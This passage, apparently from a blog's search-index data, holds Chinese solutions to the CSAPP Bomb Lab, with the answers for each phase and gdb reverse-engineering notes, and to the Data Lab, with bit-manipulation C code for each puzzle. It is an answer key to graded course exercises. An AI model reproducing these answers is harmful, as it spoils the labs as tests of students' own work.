0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）\n\n  - 0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）\n\n  - 0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。\n\n    其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令`x/30w 0x6032d0`打印改地址附近的多个字节，结果如下\n\n    ```assembly\n    0x6032d0 <node1>:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000\n    0x6032e0 <node2>:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000\n    0x6032f0 <node3>:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000\n    0x603300 <node4>:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000\n    0x603310 <node5>:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000\n    0x603320 <node6>:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000\n    ```\n\n    可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。\n\n    由此可以知道该段代码的功能为**把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定**。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。\n\n    **node地址在栈上关于读入的数字的分布规则为**\n\n    - node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0\n    - node地址按照读入数字的顺序，排列在栈上。\n\n  - 0x4011ab 到 0x4011d9：该段从`%rsp+0x20`开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：\n\n    ```c\n    struct node{\n    \tint num;\n    \tint index;\n    \tnode *next;\n    };\n\n    node **next = %rsp+0x28;\n    node **endnode = %rsp+0x50;\n    node *currentnode = *(%rsp+0x20);\n    node *temp;\n    while(1){\n    \ttemp = *next;\n    \tcurrentnode->next = temp;\n    \tnext += 1;\t//in fact, it add 8 bytes;\n    \tif(endnode==next)\n    \t\tbreak;\n    \tcurrentnode = temp;\n    }\n    temp->next = null;\n    ```\n\n  - 0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。","content":"<h1 id=\"CSAPP-Bomb-Lab\"><a href=\"#CSAPP-Bomb-Lab\" class=\"headerlink\" title=\"CSAPP Bomb Lab\"></a>CSAPP Bomb Lab</h1><h3 id=\"答案\"><a href=\"#答案\" class=\"headerlink\" title=\"答案\"></a>答案</h3><ol>\n<li>Border relations with Canada have never been better.</li>\n<li>1 2 4 8 16 32</li>\n<li>多个答案<ul>\n<li>0    207</li>\n<li>1    311</li>\n<li>2    707</li>\n<li>3    256</li>\n<li>4    389</li>\n<li>5    206</li>\n<li>6    682</li>\n<li>7    327</li>\n</ul>\n</li>\n<li><em>应该有多个答案</em><ul>\n<li>7    0</li>\n</ul>\n</li>\n<li>一个6个字符的字符串，字符串的ascii值依次为<ul>\n<li>$9+k\\times16$ </li>\n<li>$15+k\\times16$</li>\n<li>$14+k\\times16$</li>\n<li>$5+k\\times16$</li>\n<li>$6+k\\times16$</li>\n<li>$7+k\\times16$</li>\n</ul>\n</li>\n<li>​      4 3 2 1 6 5</li>\n</ol>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><h4 id=\"解答思路\"><a href=\"#解答思路\" class=\"headerlink\" title=\"解答思路\"></a>解答思路</h4><ul>\n<li>string_not_equal函数比对(0x402400)位置的string与输入的string</li>\n<li>直接运行gdb，<code>print (char*)0x402400</code>即可</li>\n<li><em>不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333</em></li>\n</ul>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><h4 id=\"解答思路-1\"><a href=\"#解答思路-1\" class=\"headerlink\" title=\"解答思路\"></a>解答思路</h4><ul>\n<li>汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入<code>1  2  4  8  16  32</code>即可AC</li>\n</ul>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><h4 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea    0xc(%rsp),%rcx //rcx=12+rsp</span><br><span class=\"line\">lea    0x8(%rsp),%rdx //rdx=8+rsp</span><br><span class=\"line\">mov    $0x4025cf,%esi //%d %d</span><br><span class=\"line\">mov    $0x0,%eax</span><br><span class=\"line\">callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>\n<p>从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb<code>print (char*)0x4025cf</code>打印出<code>&quot;%d %d&quot;</code></p>\n</li>\n<li><p>然后测试读入的第一个数字是否大于7，如果是，explode_bomb</p>\n</li>\n<li><p>然后就是一个switch，用gdb<code>x/14w 0x402470</code>打印出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x402470:\t0x00400f7c\t0x00000000\t0x00400fb9\t0x00000000</span><br><span class=\"line\">0x402480:\t0x00400f83\t0x00000000\t0x00400f8a\t0x00000000</span><br><span class=\"line\">0x402490:\t0x00400f91\t0x00000000\t0x00400f98\t0x00000000</span><br><span class=\"line\">0x4024a0:\t0x00400f9f\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>按照对应关系确定第二个读入的数字即可</p>\n</li>\n</ul>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><h4 id=\"解题思路-1\"><a href=\"#解题思路-1\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li>同样是用sscanf读入两个数字</li>\n<li>由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果</li>\n</ul>\n<h3 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h3><h4 id=\"解题思路-2\"><a href=\"#解题思路-2\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">callq  40131b &lt;string_length&gt;</span><br><span class=\"line\">cmp    $0x6,%eax</span><br></pre></td></tr></table></figure>\n<p>读入6个字符的字符串</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movzbl (%rbx,%rax,1),%ecx</span><br><span class=\"line\">mov    %cl,(%rsp)</span><br><span class=\"line\">mov    (%rsp),%rdx</span><br><span class=\"line\">and    $0xf,%edx</span><br><span class=\"line\">movzbl 0x4024b0(%rdx),%edx</span><br><span class=\"line\">mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure>\n<p>提取每个字符的ascii的低4bits，放在<code>edx</code>里，然后从<code>0x4024b0+edx</code>的位置读入数据放在栈上</p>\n</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov    $0x40245e,%esi</span><br><span class=\"line\">lea    0x10(%rsp),%rdi</span><br><span class=\"line\">callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure>\n<p>后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。</p>\n</li>\n<li><p>用gdb分别打印0x4024b0  0x40245e处的字符串，获得</p>\n<ul>\n<li><code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></li>\n<li><code>flyers</code></li>\n</ul>\n</li>\n<li><p>此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与<code>flyers</code>比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$</p>\n</li>\n<li><p>但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符</p>\n</li>\n</ul>\n<h3 id=\"第六题\"><a href=\"#第六题\" class=\"headerlink\" title=\"第六题\"></a>第六题</h3><h4 id=\"一些心得\"><a href=\"#一些心得\" class=\"headerlink\" title=\"一些心得\"></a>一些心得</h4><ul>\n<li><p>不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#from 代码段的401153</span><br><span class=\"line\">lea    0x18(%rsp),%rsi</span><br><span class=\"line\">mov    %r14,%rax</span><br><span class=\"line\">mov    $0x7,%ecx</span><br><span class=\"line\"></span><br><span class=\"line\">mov    %ecx,%edx</span><br><span class=\"line\">sub    (%rax),%edx</span><br><span class=\"line\">mov    %edx,(%rax)</span><br><span class=\"line\">add    $0x4,%rax</span><br><span class=\"line\">cmp    %rsi,%rax</span><br><span class=\"line\">jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure>\n<p>大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能</p>\n</li>\n<li><p>安利一个gdb插件<a href=\"https://github.com/longld/peda\" target=\"_blank\" rel=\"noopener\">peda</a>，大大提高gdb的用户体验</p>\n</li>\n</ul>\n<h4 id=\"解题思路-3\"><a href=\"#解题思路-3\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h4><ul>\n<li><p>整段代码分为 个部分</p>\n<ul>\n<li><p>0x4010fc 到 0x401106：读入6个数值</p>\n</li>\n<li><p>0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）</p>\n</li>\n<li><p>0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）</p>\n</li>\n<li><p>0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。</p>\n<p>其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令<code>x/30w 0x6032d0</code>打印改地址附近的多个字节，结果如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x6032d0 &lt;node1&gt;:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000</span><br><span class=\"line\">0x6032e0 &lt;node2&gt;:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000</span><br><span class=\"line\">0x6032f0 &lt;node3&gt;:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000</span><br><span class=\"line\">0x603300 &lt;node4&gt;:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000</span><br><span class=\"line\">0x603310 &lt;node5&gt;:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000</span><br><span class=\"line\">0x603320 &lt;node6&gt;:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。</p>\n<p>由此可以知道该段代码的功能为<strong>把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定</strong>。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。</p>\n<p><strong>node地址在栈上关于读入的数字的分布规则为</strong></p>\n<ul>\n<li>node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0</li>\n<li>node地址按照读入数字的顺序，排列在栈上。</li>\n</ul>\n</li>\n<li><p>0x4011ab 到 0x4011d9：该段从<code>%rsp+0x20</code>开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> index;</span><br><span class=\"line\">\tnode *next;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">node **next = %rsp+<span class=\"number\">0x28</span>;</span><br><span class=\"line\">node **endnode = %rsp+<span class=\"number\">0x50</span>;</span><br><span class=\"line\">node *currentnode = *(%rsp+<span class=\"number\">0x20</span>);</span><br><span class=\"line\">node *temp;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">\ttemp = *next;</span><br><span class=\"line\">\tcurrentnode-&gt;next = temp;</span><br><span class=\"line\">\tnext += <span class=\"number\">1</span>;\t<span class=\"comment\">//in fact, it add 8 bytes;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(endnode==next)</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\tcurrentnode = temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">temp-&gt;next = null;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。</p>\n</li>\n</ul>\n</li>\n</ul>\n","slug":"CSAPP-Bomb-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"CSAPP Data Lab","date":"2017-09-13T05:39:11.000Z","path":"2017/09/13/CSAPP-Data-Lab/","text":"CSAPP data Lab 注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。 bitAnd12345678910/* * bitAnd - x&amp;y using only ~ and | * Example: bitAnd(6, 5) = 4 * Legal ops: ~ | * Max ops: 8 * Rating: 1 */int bitAnd(int x, int y) &#123; return ~(~x|~y);&#125; 思路 德摩根定律 getByte123456789101112/* * getByte - Extract byte n from word x * Bytes numbered from 0 (LSB) to 3 (MSB) * Examples: getByte(0x12345678,1) = 0x56 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 6 * Rating: 2 */int getByte(int x, int n) &#123; int bias = n&lt;&lt;3; return (x&gt;&gt;bias)&amp;0xFF;&#125; 思路 移位到最低的1byte然后用0xFF提取 logicalShift1234567891011121314/* * logicalShift - shift x to the right by n, using a logical shift i * Can assume that 0 &lt;= n &lt;= 31 * Examples: logicalShift(0x87654321,4) = 0x08765432 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 20 * Rating: 3 */int logicalShift(int x, int n) &#123; return (1&lt;&lt;32+~n&lt;&lt;1)+~0 &amp; (x&gt;&gt;n); //equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n); //负号优先级高于移位&#125; 思路 因为不能用-，所以用取反加一代替取负 构造低32-nbit的1来提取移位后的数值 因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位 小技巧，如果n移位k，k$\\in$[0, 32]，则可以n&gt;&gt;(k-!!k)&gt;&gt;!!k bitCount12345678910111213141516171819202122232425/* * bitCount - returns count of number of 1's in word * Examples: bitCount(5) = 2, bitCount(7) = 3 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 40 * Rating: 4 */int bitCount(int x) &#123; int mark1 = 0x55; int mark2 = 0x33; int mark3 = 0x0F; mark1 |= mark1&lt;&lt;8; mark1 |= mark1&lt;&lt;16; mark2 |= mark2&lt;&lt;8; mark2 |= mark2&lt;&lt;16; mark3 |= mark3&lt;&lt;8; mark3 |= mark3&lt;&lt;16; x = (x&gt;&gt;1&amp;mark1)+(x&amp;mark1); //every two bits; clear record; x = (x&gt;&gt;2&amp;mark2)+(x&amp;mark2); //every four bits; clear record; x = (x&gt;&gt;4&amp;mark3)+(x&amp;mark3); //every eight bits; clear record; x = (x&gt;&gt;8)+x; //every 16 bits; record in the low 8 bits; x = (x&gt;&gt;16)+x; //every 32 bits; record in the low 8 bits; return x&amp;0xFF;&#125; 思路 构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目 同样的思路，提取每四位的low bit、high bit，然后相加 因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果 bang123456789101112131415/* * bang - Compute !x without using ! * Examples: bang(3) = 0, bang(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int bang(int x) &#123; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; return ~x&amp;0x1;&#125; 思路 如果非0，位模式从最高位的1到最低位都填充为1， 如果为0，则位模式还是保持全0 tmin123456789/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123; return 1&lt;&lt;31;&#125; fitBits12345678910111213/* * fitsBits - return 1 if x can be represented as an * n-bit, two's complement integer. * 1 &lt;= n &lt;= 32 * Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 2 */int fitsBits(int x, int n) &#123; return !(x&gt;&gt;n+~0)|!((x&gt;&gt;n+~0)+1); //equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)&#125; 思路 算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。 divpwr21234567891011121314/* * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30 * Round toward zero * Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 2 */int divpwr2(int x, int n) &#123; int t = x&gt;&gt;31; return (x+(t&amp;1&lt;&lt;n)+(~(t&amp;1)+1))&gt;&gt;n; //equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n; //note that &amp; 的优先级低于&lt;&lt;&#125; 思路 直接移位是round down，无论是负数还是正数 所以要实现round to zero , C表达式为x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n negate12345678910/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x+1;&#125; 思路 直接取反再加1 isPositive12345678910/* * isPositive - return 1 if x &gt; 0, return 0 otherwise * Example: isPositive(-1) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 8 * Rating: 3 */int isPositive(int x) &#123; return ~(x&gt;&gt;31)&amp;!!x;&#125; 思路 符号位判断，并且非0 isLessOrEqual1234567891011/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; return !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x+~y+1&gt;&gt;31) | !(x^y); //equal to !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)&#125; 思路 x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y ilog21234567891011121314151617181920212223242526272829303132/* * ilog2 - return floor(log base 2 of x), where x &gt; 0 * Example: ilog2(16) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int ilog2(int x) &#123; int mark1 = 0x55; int mark2 = 0x33; int mark3 = 0x0F; mark1 |= mark1&lt;&lt;8; mark1 |= mark1&lt;&lt;16; mark2 |= mark2&lt;&lt;8; mark2 |= mark2&lt;&lt;16; mark3 |= mark3&lt;&lt;8; mark3 |= mark3&lt;&lt;16; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; x &gt;&gt;= 1; x = (x&gt;&gt;1&amp;mark1)+(x&amp;mark1); //every two bits; clear record; x = (x&gt;&gt;2&amp;mark2)+(x&amp;mark2); //every four bits; clear record; x = (x&gt;&gt;4&amp;mark3)+(x&amp;mark3); //every eight bits; clear record; x = (x&gt;&gt;8)+x; //every 16 bits; record in the low 8 bits; x = (x&gt;&gt;16)+x; //every 32 bits; record in the low 8 bits; return x&amp;0xFF;&#125; 思路 先构造从最高的1到最低位均为1的二进制，然后类似bitCount float_neg123456789101112131415161718/* * float_neg - Return bit-level equivalent of expression -f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representations of * single-precision floating point values. * When argument is NaN, return argument. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 10 * Rating: 2 */unsigned float_neg(unsigned uf) &#123; unsigned t = uf&amp;0x7FFFFFFF; if(t^0x7F800000 &amp;&amp; (t&gt;&gt;23)+1&gt;&gt;8) return uf; else return uf^0x80000000;&#125; 思路 判别是否是NaN。先判断尾数是否全0，然后用(t&gt;&gt;23)+1&gt;&gt;8判断exp是否全1 float_i2f1234567891011121314151617181920212223242526272829303132333435363738394041/* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned float_i2f(int x) &#123; unsigned shiftLeft=0; unsigned afterShift, tmp, flag; unsigned absX=x; unsigned sign=0; //special case if (x==0) return 0; //if x &lt; 0, sign = 1000...,abs_x = -x if (x&lt;0) &#123; sign=0x80000000; absX=-x; &#125; afterShift=absX; //count shift_left and after_shift while (1) &#123; tmp=afterShift; afterShift&lt;&lt;=1; shiftLeft++; if (tmp &amp; 0x80000000) break; &#125; if ((afterShift &amp; 0x01ff)&gt;0x0100) flag=1; else if ((afterShift &amp; 0x03ff)==0x0300) flag=1; else flag=0; return sign + (afterShift&gt;&gt;9) + ((159-shiftLeft)&lt;&lt;23) + flag;&#125;//from http://www.cnblogs.com/tenlee/p/4951639.html 思路 分情况处理0、负数、正数 要处理舍人 向接近的舍入 如果处于中间，向偶数舍入 舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的 float_twict123456789101112131415161718192021222324252627/* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned float_twice(unsigned uf) &#123; unsigned t = uf&amp;0x7FFFFFFF; unsigned temp = t&amp;0x7F800000; unsigned temp2 = uf&amp;0xFF800000; int expFull = !(temp^0x7F800000); if(t^0x7F800000 &amp;&amp; expFull) return uf; if(expFull)&#123; return temp2; &#125; if(!(t&amp;0x7F800000))&#123; unsigned k = (uf&amp;0x7FFFFF); return temp2+(k&lt;&lt;1); &#125; return (temp&gt;&gt;23)+1&lt;&lt;23 | uf&amp;0x807FFFFF;&#125; 思路 分情况处理三种IEEE754的情况 需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了","raw":"---\ntitle: CSAPP Data Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-13 13:39:11\ntags:\n- CSAPP Lab\ndescription: CSAPP 数据实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP data Lab\n\n> 注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1>>n+1 等价于 1>>(n+1)，所以代码里写了1>>n+1。\n\n### bitAnd\n\n```c\n/* \n * bitAnd - x&y using only ~ and | \n *   Example: bitAnd(6, 5) = 4\n *   Legal ops: ~ |\n *   Max ops: 8\n *   Rating: 1\n */\nint bitAnd(int x, int y) {\n\treturn ~(~x|~y);\n}\n```\n\n#### 思路\n\n- 德摩根定律\n\n### getByte\n\n```c\n/* \n * getByte - Extract byte n from word x\n *   Bytes numbered from 0 (LSB) to 3 (MSB)\n *   Examples: getByte(0x12345678,1) = 0x56\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 6\n *   Rating: 2\n */\nint getByte(int x, int n) {\n\tint bias = n<<3;\n\treturn (x>>bias)&0xFF;\n}\n```\n\n#### 思路\n\n- 移位到最低的1byte然后用0xFF提取\n\n### logicalShift\n\n```c\n/* \n * logicalShift - shift x to the right by n, using a logical shift\n\ti\n *   Can assume that 0 <= n <= 31\n *   Examples: logicalShift(0x87654321,4) = 0x08765432\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 20\n *   Rating: 3 \n */\nint logicalShift(int x, int n) {\n\treturn (1<<32+~n<<1)+~0 & (x>>n);\n  //equal to ((1<<31-n<<1)-1)&(x>>n);\n  //负号优先级高于移位\n}\n```\n\n#### 思路\n\n- 因为不能用`-`，所以用取反加一代替取负\n\n- 构造低`32-n`bit的1来提取移位后的数值\n\n- 因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位\n\n  > 小技巧，如果n移位k，k$\\in$[0, 32]，则可以`n>>(k-!!k)>>!!k`\n\n### bitCount\n\n```c\n/*\n * bitCount - returns count of number of 1's in word\n *   Examples: bitCount(5) = 2, bitCount(7) = 3\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 40\n *   Rating: 4\n */\nint bitCount(int x) {\n\tint mark1 = 0x55;\n\tint mark2 = 0x33;\n\tint mark3 = 0x0F;\n\tmark1 |= mark1<<8;\n\tmark1 |= mark1<<16;\n\tmark2 |= mark2<<8;\n\tmark2 |= mark2<<16;\n\tmark3 |= mark3<<8;\n\tmark3 |= mark3<<16;\n\n\tx = (x>>1&mark1)+(x&mark1);\t//every two bits; clear record;\n\tx = (x>>2&mark2)+(x&mark2);\t//every four bits; 